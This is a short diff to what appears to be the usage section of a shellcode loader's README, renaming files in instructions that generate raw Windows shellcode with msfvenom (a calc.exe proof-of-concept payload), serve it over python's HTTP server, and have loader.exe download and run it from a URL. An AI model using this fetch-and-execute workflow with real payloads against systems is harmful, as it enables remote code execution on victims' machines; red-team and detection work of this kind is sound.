@@ -43,7 +43,7 @@ loader.exe http://<ip_address>/shellcode.bin
 
 Using msfvenom:
 ```bash
-msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o enc.bin
+msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
 ```
 
 Serve with python:
@@ -53,5 +53,5 @@ python3 -m http.server 80
 
 Then run
 ```bash
-loader.exe http://127.0.0.1:30001/enc.bin
+loader.exe http://127.0.0.1/shellcode.bin
 ```
